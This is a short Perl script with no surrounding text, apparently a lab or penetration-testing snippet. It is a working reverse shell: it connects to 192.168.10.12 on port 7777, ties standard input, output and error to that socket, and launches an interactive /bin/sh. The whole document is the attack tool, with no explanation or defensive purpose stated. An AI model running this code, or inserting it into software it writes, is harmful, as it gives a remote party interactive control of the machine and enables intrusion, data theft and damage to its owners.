use Socket;

socket(S, PF_INET, SOCK_STREAM, 0);

connect(S, sockaddr_in(7777, inet_aton("192.168.10.12")));

open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR, ">&S");

exec("/bin/sh -i");
